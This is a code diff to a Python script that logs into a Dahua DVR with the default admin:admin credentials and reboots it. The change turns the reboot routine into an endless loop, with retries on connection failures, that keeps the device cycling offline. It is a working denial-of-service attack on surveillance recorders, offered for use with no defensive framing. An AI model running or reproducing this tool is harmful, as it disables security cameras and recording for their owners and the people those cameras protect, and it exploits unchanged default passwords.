@@ -2,6 +2,7 @@
 #https://gist.github.com/gxfxyz/48072a72be3a169bc43549e676713201#file-dahua_rpc-py
 import itertools
 import threading
+import requests
 import time
 import sys
 from dahua_rpc import DahuaRpc, RebootDone
@@ -11,7 +12,7 @@ username = "admin"
 password = "admin"
 done = False
 
-def firstReboot():
+def singleReboot():
     dahua = DahuaRpc(host, username, password)
     print(f"Attempting to log into {host} with {username}:{password}")
     dahua.login()
@@ -23,35 +24,32 @@ def firstReboot():
     except RebootDone:
         print("DVR likely reboted!")
 
-def DOS_reboot(waiting=85):
-    #Note: This has an error margin of about 9 to 2 seconds.
-    #Wait for the DVR to come back online
-    timeStart = time.time()
-    print(f"Waiting {waiting} seconds for the DVR to reboot...")
-    #Start the waiting animation
-    done = False
-    t = threading.Thread(target=waitAnimation)
-    t.daemon = True
-    t.start()
-    time.sleep(waiting)
-    done = True
-    timeEnd = time.time()
-    #End the waiting amination
-    print(f"DVR is (probably) back online after waiting {timeEnd-timeStart} seconds")
-    print("Remember to ctrl + C to stop rebooting :)")
-    
-    #Login to the DVR
-    dahua = DahuaRpc(host, username, password)
-    print(f"Attempting to log into {host} with {username}:{password}")
-    dahua.login()
-    print(f"Correctly logged in at {dahua.current_time()}")
+def DOS_reboot():
+    while True:
+        try:
+            #Login to the DVR
+            dahua = DahuaRpc(host, username, password)
+            print(f"Attempting to log into {host} with {username}:{password}")
+            dahua.login()
+            print(f"Correctly logged in at {dahua.current_time()}")
 
-    print("Rebooting...")
-    try:
-        dahua.reboot()
-    except RebootDone:
-        print("DVR likely reboted!")
-        DOS_reboot(waiting=88)
+            print("Rebooting...")
+            try:
+                dahua.reboot()
+            except RebootDone:
+                print("DVR likely rebooted!")
+                time.sleep(10)
+                DOS_reboot()  # Continue the reboot cycle
+                break
+            except Exception as e:
+                print(f"Unexpected error 1: {e}")
+                time.sleep(0.5)
+        except requests.exceptions.ConnectionError:
+            print("Connection failed, retrying in 0.5 seconds...")
+            time.sleep(0.5)
+        except Exception as e:
+            print(f"Unexpected error 2: {e}")
+            time.sleep(0.5)
 
 def waitAnimation():
     #here is the animation
@@ -76,10 +74,12 @@ def main():
     done = False
     
     DOS = input("Do you want to keep rebooting the device? (y/n) ").lower()
-    firstReboot()
 
     if DOS == 'y':
-        DOS_reboot(waiting=85)
+        DOS_reboot()
+    elif DOS == 'n':
+        singleReboot()
+        print("Goodbye")
 
     print("Goodbye")
 
